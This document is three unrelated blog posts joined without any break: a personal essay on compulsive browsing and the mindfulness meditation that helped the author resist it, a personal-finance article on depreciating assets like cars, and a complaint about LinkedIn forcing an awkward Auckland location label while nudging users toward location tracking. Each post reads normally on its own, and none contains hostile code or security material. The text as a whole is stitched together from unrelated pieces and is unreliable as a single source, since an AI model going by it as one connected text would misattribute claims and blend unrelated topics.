        <p>This isn’t going to be a post about how adopting a several-thousand-year-old practice <a href="https://www.independent.co.uk/life-style/health-and-families/healthy-living/mindfulness-sells-buddhist-meditation-teachings-neoliberalism-attention-economy-a8225676.html">can make you a better servant of capital</a>.
Instead, let’s talk about when I feel the lowest of the low.
It comes after spending any number of hours on my computer, maybe even a full day, endlessly circling around different websites in search of stimulation, the quick jolt that comes with learning an interesting fact or watching a funny short video or seeing someone get dunked on for having a bad political opinion.
I’ll eventually wake into a state that could be identified as conscious thought, look back on the many (genuinely exciting!) things I wanted to learn or do that day, and contrast it with what I actually did.
What did I actually do? I honestly don’t even know. I doubt I could list even three things I’d read or experienced the entire preceding eight hours.
At this moment I feel very bad. I know one of the ~30,000 days in my life is gone.
And I didn’t get anything out of it.
Actually, I’m worse off, because spending your time in this way just begets even more time spent in this way.</p>
<p>I don’t have any social media apps on my phone.
I deleted my twitter account.
I deleted my reddit account.
I don’t have an instagram account.
My facebook account exists only to be part of some groups.
I use LeechBlock.
I redirect websites to 0.0.0.0 in my hosts file.
Everyone I know does most of these things.
Everyone I know still has trouble spending their time how they actually want to spend it.
If I were to write down a list of the things I find most important in life, endlessly circling around a handful of websites would not even be in consideration.</p>
<p>If I get stuck in the loop for more than a week or so my brain starts to eat itself.
There’s a visceral knawing feeling.
My thoughts dwell on how to defeat this thing which is deleting hours from my life.</p>
<p>So far the only thing which has helped is mindfulness meditation.
After sitting for 10 or 20 minutes and focusing on my breath, my mind becomes quiet.
Traffic on the <a href="https://en.wikipedia.org/wiki/Default_mode_network">default mode network</a> dies down a little bit.
I’m no longer instantly pulled into the online vortex upon encountering the slightest speedbump in my work.
Instead my mind just… stays quiet, and I keep the problem in my head.
This doesn’t last forever.
I could probably meditate for 10 minutes out of every hour and still have spent more time on the things I actually wanted to spend time on, at the end of the day.</p>
<p>Deciding to meditate is hard.
The idea of spending ten minutes intentionally doing nothing runs against a lot of messaging I’ve internalized.
It’s also very difficult to keep my attention on my breath instead of running away to consider whatever figment wanders through my thoughts.
There’s an interesting metaphor I’ve heard.
Your mind is like a train station.
Thoughts think themselves - they are trains pulling into the station.
A train of thought will shortly pull out of the station, but you don’t have to be on it.
Or maybe you just boarded it without thinking, then don’t realize what you’ve done until you’re a mile down the track.
No worries; you can always return to the station.</p>
<p>I decided to try mindfulness meditation after listening to the audio version of Robert Wright’s book <a href="http://whybuddhismistrue.net/">Why Buddhism Is True</a> while on a cross-country drive.
It’s about how many beliefs in Buddhism - specifically Western Atheistic Buddhism - have support from modern psychology &amp; neuroscience.
I wasn’t motivated to start meditating by thinking it would help me in this struggle for my attention; the discovery was quite accidental.
I use the <a href="https://www.wakingup.com/">Waking Up</a> app.
Friends of mine also report good experiences with <a href="https://www.headspace.com/">Headspace</a>.</p>
<p>It’s troubling I have to go to such lengths to live my life the way I think I want to live it.
Maybe this struggle is uniquely modern, maybe it’s one for the ages.
I still have issues sometimes, especially before bed when my defenses are lower and I can get sucked into the loop instead of reading a good book or just going to sleep.
Still, for the first time in my life I’ve found an actually effective tool for resisting the attention economy.</p>

<p>All <a href="https://www.dollartrak.com/2020/05/22/assets-explained/">assets</a> are not created equal.  Some go up in value and some don’t.  A depreciating asset is one that goes down in value over time.  Examples of depreciating assets are cars, boats, motorcycles, computers, RVs and furniture.  These assets will almost always be worth less than what you paid for them when you decide to sell them.</p>



<p>Many depreciating assets, such as cars, also have other costs associated with their ownership as well. Taxes, insurance, fuel and maintenance can all add up to make your total cost of ownership of a depreciating asset much higher than is reflected in the purchase price.</p>



<h2>Depreciation Rate  </h2>



<p>The difference between what you paid and what you sell the item for is your cost to own the asset.  Not all items of the same type depreciate at the same rate.  Luxury cars such as a BMW might depreciate at 20% a year, where as a Toyota Tacoma might only depreciate at 10% a year.  </p>



<figure><img loading="lazy" width="600" height="400" src="https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/bimmer.jpg?resize=600%2C400&amp;ssl=1" data-src="https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/bimmer.jpg?resize=600%2C400&amp;ssl=1" alt="BMW M Series" title="Cars are a Depreciating Asset" data-srcset="https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/bimmer.jpg?w=600&amp;ssl=1 600w, https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/bimmer.jpg?resize=300%2C200&amp;ssl=1 300w" data-sizes="(max-width: 600px) 100vw, 600px" data-recalc-dims="1"><figcaption>BMW M3 Hauls tail but drops like a rock in value</figcaption></figure>



<p>Take the depreciation rate into account when making a large purchase as it will greatly affect the total cost to own the asset.  Not only would a BMW be double the purchase price of the Tacoma, but it would also depreciate twice as fast.  This ultimately makes your total cost to own the vehicle 4 times as high!</p>



<h2>Limit spending on Depreciating Assets</h2>



<p>You will want to limit the money you spend on depreciating assets as much as possible.  In general these assets will not help you to compound your wealth.  You will need to purchase depreciating assets to live your life but don’t fool yourself into thinking that these material purchases make you wealthy.  In fact they do just the opposite!  </p>



<p>Every dollar you spend on a depreciating asset is one that you cannot invest.  Due to the compounding nature of investment returns you can actually lose out on many times the original purchase price of the depreciating asset due to the <a href="https://www.dollartrak.com/what-is-opportunity-cost/">opportunity cost</a>. </p>



<h2>Conclusion</h2>



<p>Depreciating assets are generally material goods that you purchase to use.  As they age they lose value, decreasing your <a href="https://www.dollartrak.com/net-worth-explained/">net worth</a> in the process.  Limit your spend here so that you can concentrate on investing the savings instead.  </p>



<p>Whatever your <a href="https://www.dollartrak.com/set-and-achieve-financial-goals/">financial goals</a> are, overspending here will make them harder to obtain.</p>

<p>I got this email from Linkedin this morning. It is telling me that they are going to change my location from “<strong>Auckland, New  Zealand</strong>” to “<strong>Auckland, Auckland, New Zealand</strong>“. </p>



<figure><img loading="lazy" width="496" height="512" src="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-33-26.png" alt="" srcset="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-33-26.png 496w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-33-26-291x300.png 291w" sizes="(max-width: 496px) 100vw, 496px"><figcaption>Email from Linkedin on 30 August 2020</figcaption></figure>



<p>Since “Auckland, Auckland, New Zealand” sounds stupid to New Zealanders (Auckland is pretty much a big city with a single job market and is not a state or similar) I clicked on the link and opened the application to stick with what I currently have</p>



<figure><img loading="lazy" width="912" height="557" src="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-36-46.png" alt="" srcset="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-36-46.png 912w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-36-46-300x183.png 300w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-36-46-768x469.png 768w" sizes="(max-width: 912px) 100vw, 912px"></figure>



<p>Except the problem is that the pulldown doesn’t offer many any other locations</p>



<figure><img loading="lazy" width="546" height="316" src="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-38-03.png" alt="" srcset="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-38-03.png 546w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-38-03-300x174.png 300w" sizes="(max-width: 546px) 100vw, 546px"></figure>



<p>The only way to change the location is to click “use Current Location” and then allow Linkedin to access my device’s location.</p>



<div><p>According to <a href="https://www.linkedin.com/help/linkedin/suggested/110568">the help page</a>:</p><p><em>By default, the location on your profile will be suggested based on the postal code you provided in the past, either when you set up your profile or last edited your location. However, you can manually update the location on your LinkedIn profile to display a different location.</em></p></div>



<p>but it appears the manual method is disabled. I am guessing they have a fixed list of locations in my postcode and this can’t be changed.</p>



<p>So it appears that my options are to accept Linkedin’s crappy name for my location (Other NZers have posted problems with their location naming) or to allow Linkedin to spy on my location and it’ll probably still assign the same dumb name.</p>



<figure><img loading="lazy" width="489" height="42" src="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-48-43.png" alt="" srcset="https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-48-43.png 489w, https://blog.darkmere.gen.nz/wp-content/uploads/2020/08/Screenshot-from-2020-08-30-12-48-43-300x26.png 300w" sizes="(max-width: 489px) 100vw, 489px"></figure>



<p>The basically appears to be a way for Linkedin to push user to enable location tracking. While at the same time they get to force their own ideas on how New Zealand locations work on users.</p>
